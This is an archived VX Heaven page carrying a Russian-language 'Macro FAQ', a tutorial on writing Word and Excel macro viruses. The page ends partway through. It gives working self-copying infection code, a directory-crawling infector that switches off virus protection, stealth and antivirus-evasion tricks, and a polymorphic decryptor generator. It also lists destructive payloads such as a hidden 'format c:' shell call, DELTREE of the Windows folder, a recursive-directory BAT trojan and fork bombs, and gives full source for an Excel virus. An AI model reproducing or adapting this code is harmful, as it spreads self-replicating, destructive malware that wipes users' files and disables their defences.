<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> CyberShadow 'Macro FAQ' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="CyberShadow"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, CyberShadow,Macro FAQ, echo, wordobj, hkey, software, shitty, user, current, quit, excel, microsoft, windows, lines, application, item, строки"/>
<meta name="Description" content="[...] Написать MACRO - штучку оказалось просто, как..., нужно всего лишь немного шарить в BASIC'е и знать ГЛАВНУЮ команду WordVirus'a - MacroCopy Source, Destination [...]"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"6acfae6cc15f3900974741a5759ce4bd29632e67-1498758058-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vcs00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Macro FAQ</h1><p><a href="/lib/?lang=ru&amp;author=CyberShadow"> CyberShadow</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vcs00.html';</script>[<a style="" href="/lib/?lang=RU&amp;index=MA#vcs00">Вернуться к списку</a>] [<a href="/lib/vcs00.html#disqus_thread">Комментарии</a>]<br/> 
<ul>
<li><a href="#p1">1. Макровирусы для Microsoft Word 6.0/7.0 (1997, журнал V_Zone)</a>
<ul>
<li><a href="#p11">1.1. Основные положения</a></li>
<li><a href="#p12">1.2. Переменные и константы</a></li>
<li><a href="#p13">1.3. Стелс-технологии</a></li>
<li><a href="#p14">1.4. Анти-эвристика</a></li>
<li><a href="#p15">1.5. Примечания</a></li>
</ul></li>
<li><a href="#p2">2. Макровирусы для Microsoft Word 97</a>
<ul>
<li><a href="#p21">2.1. Основные положения</a></li>
<li><a href="#p22">2.2. Стелс-технологии</a></li>
<li><a href="#p23">2.3. Полиморфизм (1999, журнал DVL#9)</a></li>
<li><a href="#p24">2.4. Примечания</a></li>
</ul></li>
<li><a href="#p3">3. Хачу напакостить! (Что бы такого сделать плохого?)</a>
<ul>
<li><a href="#p31">3.1. Мелкие приколы типа FORMAT C:</a></li>
<li><a href="#p32">3.2. Как постирать файлы нафиг?</a></li>
<li><a href="#p33">3.3. Как установить пароль для документа Word97?</a></li>
<li><a href="#p34">3.4. Что может BAT?</a></li>
</ul></li>
<li><a href="#p4">4. Собственно FAQ как есть</a>
<ul>
<li><a href="#p41">4.1. А как работает VBA в Excel97?</a></li>
<li><a href="#p42">4.2. А можно написать вирус заражающий Word и Excel?</a></li>
<li><a href="#p43">4.3. Где еще использовать комманды SetObject и CreateObject?</a></li>
<li><a href="#p44">4.4. Можно ли запустить какую-нибудь программу пользуяюсь средствами VBA?</a></li>
<li><a href="#p45">4.5. Можно ли получить доступ к системному окружению?</a></li>
<li><a href="#p46">4.6. Можно ли написать IRC-червя средствами VBA?</a></li>
<li><a href="#p47">4.7. А я слышал, можно отключить VirusProtection напрямую из реестра, правда ли это?</a></li>
<li><a href="#p48">4.8. Как получить адрес папки "Мои документы"?</a></li>
<li><a href="#p49">4.9. Как сделать "Проводник" средством запуска VBA вируса?</a></li>
<li><a href="#p4a">4.10. Может ли VBA вирус переносить в своем теле другие вирусы (трояны)?</a></li>
<li><a href="#p4b">4.11. Power Point вирусы</a></li>
<li><a href="#p4c">4.12. Да здраствует E-MAIL!</a></li>
</ul></li>
<li><a href="#p5">5. Куда писать ругательства, по поводу всего этого?</a></li>
<li><a href="#p6">6. Благодарности</a></li>
</ul>
<h2><a name="p1">1. Макровирусы для Microsoft Word 6.0/7.0 (1997, журнал V_Zone)</a></h2>
<h3><a name="p11">1.1. Основные положения</a></h3>
<p>Написать MACRO - штучку оказалось просто, как..., нужно всего лишь немного шарить в BASIC'е и знать ГЛАВНУЮ команду WordVirus'a -</p>
<pre class="source">
	MacroCopy Source, Destination
</pre>
<p>которая копирует макрос из Source в Destination, но в вирусе используется два варианта этой команды:</p>
<dl>
<dt><code>MacroCopy FileName$()+":MacroName1","Normal:MacroName2"</code></dt>
<dd>копирует макрос из файла в NORMAL.DOT</dd>
<dt><code>MacroCopy "Normal:MacroName1",FileName$()+":MacroName2"</code></dt>
<dd>копирует макрос из NORMAL.DOT в файл.</dd>
</dl>
<p>Кроме того, чтобы ваш вирус успешно существовал в среде Word'a необходимо знать как собственно вирус запускается из файла: нужно всего лишь, чтобы запускаемый макрос имел имя в файле AutoOpen и все! При открытии файла Word автоматически запустит это макрос! Заражение файла осуществляется примерно также, важно чтобы в файле NORMAL.DOT присутствовал макрос FileOpen и при открытии файла зараженным Word'oм вы получите доступ к файлу.</p>
<h3><a name="p12">1.2. Переменные и константы</a></h3>
<dl>
<dt><code>dlg</code></dt>
<dd>массив Word'а используется им для поддержки макросов вызываемых другим макросом.</dd>
<dt><code>FileName$()</code></dt>
<dd>имя открытого файла</dd>
<dt><code>CountMacros</code></dt>
<dd>количество макросов</dd>
<dt><code>MacroName$</code></dt>
<dd>имя макроса</dd>
<dt><code>Normal</code></dt>
<dd>имя файла в котором хранятся макросы (русский Word) если вы хотите заражать аглицкий Word, замените везде Normal на Global</dd>
</dl>
<h3><a name="p13">1.3. Стелс-технологии</a></h3>
<p>Это ваще дребедень, проблема данного MACRO - вируса: его можно легко найти и уничтожить, используя меню Сервис-Макрос, так вот чтобы этого не происходило вместе с макросами вируса распространяйте макрос</p>
<pre class="source">
macros -= ToolsMacro =-
Sub Main
End Sub
</pre>
<p>Это не ошибка! Распространяйте ПУСТОЙ макрос и все проблемы с простотой будут решены! Правда есть одно НО. Глупый юзер обломится со всеми остальными макросами :( Более сложный, но и более корректный способ: обрабатывать ToolsMacro самому.</p>
<h3><a name="p14">1.4. Анти-эвристика</a></h3>
<p>Как сделать так, чтобы DrWEB и иже с ним не ловили ваши детища? Тут необходимо немного фантазии, но все же:</p>
<ol>
<li>DrWEB не обрабатыает, например, смену шрифта.</li>
<li>Создаете макрос со случайным именем и записываете туда строку MacroCopy ... , ... но перед этим задаете шрифт какого-нибудь размера и записываете строку, расшифровывая по маске шрифта, запускаете этот макрос и удаляете его! И все, все!</li>
</ol>
<h3><a name="p15">1.5. Примечания</a></h3>
<p>Стартовые макросы могут быть <code>AutoOpen, AutoClose, AutoSave</code>.</p>
<p>Глобальные макросы <code>FileOpen, FileSaveAs, FileSave, FileClose</code>.</p>
<p>Word.Macro.Stealth (AVP) - использует эти технологии и 2 года назад не ловился даже на высшем уровне эвристики.</p>
<h2><a name="p2">2. Макровирусы для Microsoft Word 97</a></h2>
<h3><a name="p21">2.1. Основные положения</a></h3>
<p>Здесь все немного сложнее, поскольку Microsoft, наученная горьким опытом макро-вирусов под Office 95, решила, что нужно сделать какую-никакую защиту от макро-зверьков (и надо признаться, для этого были все основания :). Но, главная ошибка компьютера это пользователь и поэтому у зверей есть все-таки шанс!</p>
<p>Язык теперь несколько другой, был WordBasic стал Visual Basic for Application (VBA).</p>
<p>Отталкиваясь от написания макросов для Office 95, рассмотрим 1 способ написания макро-вирусов для Word 97:</p>
<h4>ЗАРАЖЕНИЕ, ИСПОЛЬЗУЯ СТАРЫЙ МЕТОД КОПИРОВАНИЯ МАКРОСОВ</h4>
<p>собственно команда копирования: <code>Application.OrganizerCopy Source, Destination, Name, Object</code></p>
<p>где Source - Source:=NormalTemplate.FullName, - откель копируем зараженные макросы</p>
<p>Destination - Destination:=ActiveDocument.FullName, - куда копируем</p>
<p>Name - Name:="Your own macromodule name" - имя модуля (не отдельного макроса, а сразу всего блока!)</p>
<p>Object - Object:=wdOrganizerObjectProjectItems - собственно что копировать - макросы</p>
<p>эта команда показывает копирование из зараженного документа в Normal.dot, при копировании из Normal.dot в документ соответсвенно меняем местами пути Source и Destination</p>
<p>Но, спасибо Microsoft, теперь больше простора для фантазии, поэтому еще способы:</p>
<p>2 способ написания макро-вириев:</p>
<h4>ЗАРАЖЕНИЕ, ИСПОЛЬЗУЯ ФУНКЦИИ IMPORT И EXPORT</h4>
<p>Итак, идея здесь несколько другая, и лежит целиком на совести разработчиков Word'a, состоит эта идея в том, что вы копируете весь модуль на диск, а затем импортируете его в заражаемый файл. Вот как это делается в вирусе xix.Poppy от VicodinES:</p>
<pre class="source">
	ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
	ActiveDocument.VBProject.VBComponents.Import "c:\xix.drv"
</pre>
<p>Маленькое примечание: "xix" - имя блока макросов,</p>
<p>"c:\xix.drv" - имя файла для экспорта/импорта модулей</p>
<p>Расширение у подобного рода файлов обычно .drv, .sys и подобные системные сделано это для того, чтобы при просмотре, например из проводника, этого файла не было видно.</p>
<p>3 способ написания макро-вириев:</p>
<h4>ЗАРАЖЕНИЕ, ИСПОЛЬЗУЯ ФУНКЦИИ РАБОТЫ С ФАЙЛОМ</h4>
<p>Раз мы заговорили о import/export, то, можно работать напрямую с файлом используя старые добрые операторы PRINT и LINE INPUT. Вот как это реализовано в вирусе Ethan:</p>
<p>Сначала копирование модуля на диск:</p>
<pre class="source">
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
</pre>
<p>А затем перенос из файла в документ:</p>
<p>если Normal.dot не заражен то:</p>
<pre class="source">
	Set t = NormalTemplate.VBProject.VBComponents.Item(1)
</pre>
<p>если открываемые документ не заражен то:</p>
<pre class="source">
	Set t = ActiveDocument.VBProject.VBComponents.Item(1)
</pre>
<p>затем:</p>
<pre class="source">
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
</pre>
<p>Работа с файлами не заканчивается только такими способами, резонно было бы применить сканирование директорий как в нерезидентных вирусах. Учитывая трепетное отношение LovinGod'а к копированию его материалов, сразу утверждаю: СЛЕДУЮЩИЙ СПОСОБ ВЗЯТ С САЙТА ГРУППЫ SG, ИЗ РАЗДЕЛА IV ONLINE, ФАЙЛ WMACRO.TXT, АВТОР ULTRAS (вот и ты попал в FAQ :)</p>
<p>"Нерезидентен" - при открытии зараженного файла ищет документы в каталогах от текущего каталога до корневого и заражает их. Свое присутствие в файле определяет по последовательности байт, которую при заражении записывает в неиспользуемую область заголовка документа.</p>
<pre class="source">
Sub AutoOpen()
'заражает при открытий документов
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
'Выключает защиту от вирусов и запуск авто-функций.
rsminf: FileName$ = CurDir$ + "" + Dir("*.doc")
'ищем doc файлы в текущем каталоге
Open FileName$ For Input As #1
'открываем файл
Seek #1, 521
'ищем в нем строку
RSM$ = Input$(3, #1)
Close #1
If RSM$ = Chr$(1) + Chr$(18) + Chr$(191) Then GoTo chgdir
'если нашли свои опозновательные знаки, то меняем директорию
Open FileName$ For Append As #1
'нашли не зараженный документ откроем его
Seek #1, 523
'ищем строку
Print #1, Chr$(1) + Chr$(18) + Chr$(191) + Chr$(0) + Chr$(0)
'вписываем в найденный док метку вируса
Close #1
'закрываем документ
rsmdoc = ActiveDocument.FullName
Application.Documents.Open FileName
'открываем документ
Application.OrganizerCopy Source:=rsmdoc, Destination:=FileName, 
	Name:="RatSMagic", Object:=wdOrganizerObjectProjectItems
'копируем модуль вируса в документ
Application.Documents.Save
'сохраним зараженный документ
ActiveDocument.Close
'закрываем
chgdir: ChDir ".."
'изменяем директорию
GoTo rsminf
'поиск файлов
ecsit:
end sub
</pre>
<p>И, последний способ, различные реализации которого используются в большинстве вирусов выходящих в последнее время.</p>
<pre class="source">
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
'В NT хранится путь к макросам Normal.dot
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'В AD хранится путь к макросам активного документа
If NT.lines(1, 1) = "" Then
'Если нет никаких макросов в Normal.dot
NT.Insertlines 1, AD.lines(1, AD.countoflines)
'копируем макросы из активного документа в Normal.dot
End If
If AD.lines(1, 1) = "" Then
'Если нет никаких макросов в активном документе
AD.Insertlines 1, NT.lines(1, NT.countoflines)
'копируем макросы из Normal.dot в активный документ
End If
</pre>
<p>Кстати, этот способ самый идеальный для шифрованных и полиморфных вирусов, но об этом позже.</p>
<h3><a name="p22">2.2. Стелс-технологии</a></h3>
<p>Здесь тоже все аналогично Office 95, но более продвинуто, то есть перекрыть нужно не только ToolsMacro, а несколько:</p>
<p>Далее показано на примере, как сделать стелс обработчик для Word97.</p>
<pre class="source">
'Отключить просмотр кода
Sub ViewVBCode(): Stealth: End Sub
'Отключить просмотр макросов
Sub ToolsMacro(): Stealth: End Sub
'Отключить просмотр подключенных модулей
Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
'Вырубить показ РедактораVB: Отключить клавишу Break
Application.ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
</pre>
<h3><a name="p23">2.3. Полиморфизм</a></h3>
<p><cite>(1999, журнал DVL#9)</cite></p>
<p>Итак, на данный момент есть множество полиморфов на VB, но подавляющее большинство из них являются не совсем полиморфами, то есть представляют из себя конструкции типа:</p>
<pre class="source">'kj2atlk3jOIJOJ6LkjrlJlkjLjrk22
For i=1 To n
'hjkljhlkjhl324jhlkqj3h5jkqhb
MsgBox i
'jhjehodhfgjnkbkjwekjt25jkbkjbKJBKJB
Next
</pre>
<p>В зависимости от алгоритма и фантазии автора вируса эти строки могут содержать в себе различные символы, но основная идея остается той же - вставлять между строками строки переменной длины с различными символами. Недостатки ясны - стоит отсеять все ремарки, и voila! Вот ваш вирус. Кроме того, большинство полиморфов модифицируют весь свой код, не производя никаких проверок, что очень быстро делает вирус просто огромным по размеру, и либо преращает его дальнейшее распространение, либо ясно показывает, что файл поражен вирусом :(. Хотя сбылась мечта всех вирмакеров, модифицировать весь код вируса, но толку принесло совсем мало :(. Зачем изобретать велосипед? Есть множество хороших алгоритмов для создания защищенных вирусов. Причем эти алгоритмы давно используются для создания вирусов под DOS и Windows. Это старые добрые шифрующие алгоритмы различной сложности. Существует множество статей о создании шифрованного вируса под Word, но тем не менее, я коснусь этой темы (кратко). Зашифрованное тело можно хранить, как минимум двумя способами:</p>
<ol>
<li>Создавая переменную в которой храниться зашифрованное тело вируса:
<pre class="source">
CryptedVirusBody="hl23kj6liuhrkljhluhilUHLIhliu"
CryptedVirusBody=CryptedVirusBody+"sdg3wW#HSDsehEh"
</pre></li>
<li>Храня зашифрованное тело вируса прямо в исходном коде:
<pre class="source">
Private Sub CryptedVirusBody()
'jl;kj2lkj;Ij)JHhh5kjhKJhKJ5huoho
'LKjlkigsohjwhj4klhLhLKhlwktioh
'JklwjijgnLnlniowngoi
End Sub
</pre></li>
</ol>
<p>Разумеется, при разных способах хранения, существуют разные способы расшифровки, для первого способа вы пишите декриптор работающий напрямую с переменной, в которой храниться зашифрованное тело вируса. Для второго же способа понадобиться алгоритм работающий напрямую с исходным кодом, то есть что-то вроде:</p>
<pre class="source">
c=lines(j,1)
if mid$(c,1,1)="'" then
</pre>
<p>... расшифровка ...</p>
<pre class="source">
ReplaceLine j, EncryptedVariable
End If
</pre>
<p>Где j - номер строки кода.</p>
<p>У обоих способов есть свои преимущества и недостатки, у первого способа это необходимость выработки алгоритма который вставляет куда-то расшифрованную строку, у второго - некоторая громоздкость кода для работы с поиском строк. Выбирайте любой. Существуют еще способы хранения зашифрованных строк, но эти самые простые. Вот, вкратце и все о шифровании тела вируса.</p>
<p>Теперь, о самом интересном: о полиморфах. Рассмотрим следующий пример:</p>
<pre class="source">
For i=1 to n 'часть расшифровщика;
For j=1 to 12425 '-+
eyeu=12 ' |
do while eyeu&lt;234 ' | мусор;
eyeu=eyeu+43 ' |
loop ' |
next '-+
lkj=ljk+1 'часть расшифровщика;
jkhlk=142 '-+
if sdfg&lt;kleh then ' |
gsdfgyeu=122 ' |
do while gsdfgyeu&lt;253 ' |
gsdfgyeu=gsdfgyeu+23' | мусор;
jhlkjh=lkwjf+nkvsv ' |
loop ' |
end if '-+
next 'часть расшифровщика;
</pre>
<p>Как видим, во вполне осмысленной программе, которая что-то делает, существует часть команд, которые отвечают за расшифровку тела вируса... Единственный из такого рода полиморфов (из тех которые я видел) делал подобное, но только добавляя "левые" переменные, причем без всяких операций с ними, то есть тот же "мусор" которые легко отсеивается. Каким же образом достигается создание такого рода полиморфных блоков? Достаточно просто:</p>
<pre class="source">
private sub polym(fc,m)
'где fc - переменная в которую будет дописывать полиморфный блок;
'm - переменная определяющая степень рекурсии (чем больше степень
' тем сложнее полиморфная программа, тем больше места она
' занимает.
select case int(rnd*6)
case 1
fc=fc+"for i=1 to 1234"
m=m+1
if m&lt;MaxRecurs then call polym(fc,m)
fc=fc+next
case 2
case 3
и т.д.
case else
end select
end sub
</pre>
<p>Этим способом можно добавлять ЛЮБЫЕ блоки программы, я использовал следующие:</p>
<ol>
<li>FOR-NEXT</li>
<li>DO WHILE-LOOP</li>
<li>DO UNTIL-LOOP</li>
<li>DO-LOOP WHILE</li>
<li>DO-LOOP UNTIL</li>
<li>IF-END IF</li>
<li>Change variables</li>
</ol>
<p>Разумеется, конфигурация блоков зависит от вашей фантазии, но могу сделать подсказку: для всех циклов можно использовать случайные начальные и конечные значения, а также случайный шаг. Для блоков с условиями еще больше:</p>
<p>операции с разными переменными, комбинации "&lt;", "&gt;", "=" и сравнение с RND.</p>
<p>Для работы с работы с переменными следующие варианты:</p>
<pre class="source">
var1=random
var1=var1+var2
var1=var2+var3
var1=var2
</pre>
<p>и т.д.</p>
<p>Вот и все о рекурсивных полиморфных алгоритмах. Но! После того, как вы написали программу генерирующую полиморфный расшифровщик, сразу же всплывает масса проблем о которых вы раньше не подозревали: длина одной сроки не может быть больше 1024 символов, размер одной процедуры не может быть больше 64 килобайт. И та и другая проблема сказывается на возможностях полиморфа. Итак, вы должны внести корректировку по длине строки, на полиморфных блоках это не сказывается, а вот если вы храните зашифрованное тело вируса в строковых переменных, тогда придется делить переменную на части. Размер полиморфа можно коррекитровать уменьшая степень рекурсии. Есть другой вариант, перемешать строки расшифровщика и добавить в него вызов процедур, тогда размер вируса равномерно распределиться между процедурами и ни одна из них не будет больше 64К. Как перемешать, спросите вы? Тогда ведь структура расшифровщика нарушиться и он будет представлять собой просто набор нерабочих комманд. Приведу пример:</p>
<pre class="source">
private sub try()
goto loop1
loop2:
msgbox "метка номер двас :)"
goto loop3
loop1:
msgbox "метка номер раз"
goto loop2
loop3:
end sub
</pre>
<p>Что сделает такая программа когда вы ее запустите? Правильно, сначала напечатат про метку номер раз, а потом про метку номер двас. Но ведь метка номер два у нас идет первой? Как же так? Поняли? Та же самая идея в полиморфе, имеется куча премешанных команд, которые после выполнения уходят в случайное место кода, где уже подготовлена следующая команда для выполнения. Кроме того, чтобы не перегружать размер подпрограммы, мы с чистой совестью можем сделать вызов процедуры вместо GOTO, разумеется процедуру нужно вызывать со всеми переменными используемыми в расшифровщике, либо объявлять их глобальными, но это уже мелочи.</p>
<p>Теперь о возможных глюках:</p>
<ol>
<li>Длина одной строки должна быть меньше 1024 символов;</li>
<li>Размер одной процедуры должен быть меньше 64К;</li>
<li>Переменные используемые в расшифровщике должны быть доступны в любой подпрограмме;</li>
<li>Переменные используемые в расшифровщике и используемые в "мусоре" не должны совпадать, иначе расшифровка пойдет неправильно;</li>
<li>Циклы в "мусоре" не должны быть очень большими, иначе юзер может подумать, что компьютер завис;</li>
<li>Имена меток не должны совпадать с именами любых переменных;</li>
<li>Любая строка с условием должна стоять отдельно: никаких lkj=24: if jkh&lt;qfg then :jkwg=wga:</li>
</ol>
<p>в первом двоеточии произойдет ошибка, во втором исполнится как код.</p>
<p>Все примеры описываемые здесь подразумевали, что каждая строка идет отдельно, но есть же еще и двоеточия! Делайте случайный выбор между символами окончания строки Chr$(13)+Chr$(10) и ":". Разумеется, нужна проверка на длину строки и проверка на "одиночество" условий. Кроме того, для усложнения детектирования, я использовал различные операторы для основного цикла.</p>
<h3><a name="p24">2.4. Примечания</a></h3>
<p>Имена макросов такие же как в Office 95, но имена программ VBA следующие:</p>
<p>Document_Close(), Document_Open(), Document_New() и другие.</p>
<h2><a name="p3">3. Хачу напакостить! (Что бы такого сделать плохого?)</a></h2>
<p>Сладкое слово ДЕСТРУКЦИЯ! В самом деле, если уж мы пишем вирус, почему бы не организовать попавшему на вирусный крючок немного веселой жизни? Как говорил Карлсон, курощение и дуракаваляние :). Итак, что бы такого сделать плохого?</p>
<h3><a name="p31">3.1. Мелкие приколы типа FORMAT C:</a></h3>
<p>Это всем давно известно и потому мало интересно: Самый простой и самый тупой способ испортить человеку жизнь. Всего лишь вставьте строчку в AUTOEXEC.BAT: echo y|FORMAT c: /q &gt;nul</p>
<p>Или, если вашей душе лениво ждать, можно напрямую:</p>
<pre class="source">
shit$ = "echo y|format c: /q"
Shell Environment$ ("COMSPEC") + "/c" + shit$, 0
</pre>
<p>В последнем случае скорее всего будет облом, так как маздай не любит таких фокусов с рабочим диском :(.</p>
<h3><a name="p32">3.2. Как постирать файлы нафиг?</a></h3>
<p>В VB есть чудный оператор: KILL "fucking filename" и привет: Кстати этот деструктив наиболее распространен, видимо весь винт форматить совесть не позволяет :). Этот прикол часто используется для удаления файлов антивирусных программ.</p>
<p>Кроме того, если пишется BAT вирус, аналог этой команды DEL filename.ext</p>
<p>Оба этих оператора прекрасны поддержкой фич типа *.*, win*.?o? и так далее:</p>
<p>Ну если вам и этого мало, то к вашим услугам прога DELTREE (%windir%\command\deltree.exe). Примеры использования:</p>
<dl>
<dt><code>Deltree C:\WINDOWS</code></dt>
<dd>удаляет C:\WINDOWS вместе с именем директории WINDOWS</dd>
<dt><code>Deltree C:\WINDOWS\</code></dt>
<dd>удаляет содержимое каталога оставляя имя директории нетронутым :)</dd>
</dl>
<h3><a name="p33">3.3. Как установить пароль для документа Word97?</a></h3>
<pre class="source">
	ActiveDocument.Password = "Oops!"
</pre>
<p>Данная строчка ставит пароль на активный документ и хрен вы его откроете не зная пароля! (Ломалки не в счет :).</p>
<h3><a name="p34">3.4. Что может BAT?</a></h3>
<p>Учитывая, что остались извращенцы, любящие писать BAT вирусы и трояны, можно привести несколько приколов спецом для подобного рода людей (Фраза-то какая!)</p>
<p>Вот например:</p>
<pre class="source">
@echo off
set flag=1
:loop
rem break=off
if %flag%==false goto halt >>nul
if %flag%==true goto continue >>nul
:begin
set dir=1
rem set c=1
:continue
if %dir%==11111111 goto halt >>nul
md %dir% >>nul
set c=%c%1
if exist %0.bat copy %0.bat %dir% >>nul
if not exist %0.bat copy %0 %dir% >>nul
if %c%==1111111111111111111 goto gon >>nul
cd %dir% >>nul
rem call %0
goto loop
:gon
cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.. >>nul
set dir=%dir%1
set flag=true
set c=1
rem call %0
goto loop
:halt
set flag=false
rem cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..
cd 1 >>nul
set dir=1
set c=1
set flag=flag
echo pause
rem pause
%0
</pre>
<p>Этот ужас написал NKM__Soft. Что же это такое и что оно может? Данная программа не что иное как троян, создающий рекурсивно вложенные директории, в результате вызывая переполнение FAT и невозможность нормальной работы, правда на современных винтах он теряет свою убойную силу :(. Подобного рода игрушки существуют и под MD:</p>
<pre class="source">
@echo off
start /m %0
pause
</pre>
<p>либо:</p>
<pre class="source">
@echo off
:looping
start /m %0
goto looping
</pre>
<p>ничего хорошего, просто один из способов завесить машину (Зато какой!).</p>
<p>Кстати, ни один из этих приколов не обнаруживается Duke's BAT checker, как же так? :)</p>
<h2><a name="p4">4. Собственно FAQ как есть</a></h2>
<h3><a name="p41">4.1. А как работает VBA в Excel97?</a></h3>
<p>A.: Аналогично Word97, но с некоторыми отличиями: например, вместо Document_Open - Workbook_Open. Кроме того, в Excel нет общего шаблона типа Normal.dot, и поэтому заражение осуществляется, зараженный файл копируется в директорию Microsoft Office\Office\XLStart и при старте Excel этот файл автоматически загрузится и макросы в нем станут глобальными! Получить эту директорию можно как Application.StartupPath</p>
<p>А вот и более подробно</p>
<p>Приведу пример простого XL97 вируса, в котором используется VBA процедура:</p>
<pre class="source">
'XL97.Shitty
'by CyberShadow//SMF
'--- Маленький копирайт, 1-я строчка используется как метка заражения
Private Sub Workbook_BeforeClose(Cancel As Boolean)
'--- Имя программы VBA автоматически исполняемой в момент закрытия
' книги
 On Error Resume Next
 fl = 0&#9;&#9;&#9;&#9;'--- флаг заражения
 With Application.FileSearch&#9;'--- искать файло
 .NewSearch&#9;&#9;&#9;'--- новый поиск
 .LookIn = Application.StartupPath&#9;'--- в каталоге автозагрузки
 .SearchSubFolders = True&#9;&#9;'--- ну и в подкаталогах тоже
 .FileName = "shitty.xls"&#9;&#9;'--- имя файла (можно по маске)
 .MatchAllWordForms = True&#9;'--- имя хоть 'ShItTy.xLs'
 .FileType = msoFileTypeAllFiles&#9;'--- любого типа
 If .Execute() &gt; 0 Then fl = 1&#9;'--- если нашли то...
 End With&#9;&#9;&#9;'--- Хана поиску
 If fl = 0 Then Workbooks.Add.SaveAs FileName:=Application.StartupPath &amp; 
 	"\shitty.xls", FileFormat:=xlNormal, AddToMru:=False
 '--- Если не заражены создать новую книгу и дать ей имя 'shitty.xls'
 Set shitSource = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 '--- Где код вируса
 For i = 1 To Workbooks.Count
 '--- Сканнем все открытые книги
 Set shitDest = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 '--- Куды копировать код вируса 
 If shitDest.Lines(1, 1) &lt;&gt; "'XL97.Shitty" Then
 '--- Мы уже тут?
 shitDest.InsertLines 1, shitSource.Lines(1, shitSource.CountOfLines)
 '--- Нифига, тады заразим!
 End If
 Next
 If fl = 0 Then Workbooks("shitty.xls").Save: Workbooks("shitty.xls").Close
 '--- Если не был заражен Excel, то зараженную книгу запишем
End Sub
</pre>
<h3><a name="p42">4.2. А можно написать вирус заражающий Word и Excel?</a></h3>
<p>A.: Да, можно. Благодаря корпорации Microsoft все приложения Office 97 могут общаться между собой. Делается этос помощью комманд SetObject и CreateObject. Вот как это реализовано в вирусе MultiSys (Office97.Triplex.c или Office97.Hooper.g):</p>
<pre class="source">
xlsObj = GetObject(, "Excel.Application"): Quit = 0
If xlsObj = "" Then
Set xlApp = CreateObject("Excel.Application"): Quit = 1
End If
If UCase(Dir(xlApp.Application.StartupPath + "\cs.xls"))&lt;&gt; UCase("CS.XLS") Then
xlApp.Workbooks.Add.SaveAs xlApp.Application.StartupPath &amp; "\cs.xls"
xlApp.Workbooks("cs.xls").VBProject.VBComponents.Item("ThisWorkbook").
	CodeModule.InsertLines 1, NT.Lines(1,NT.CountOfLines)
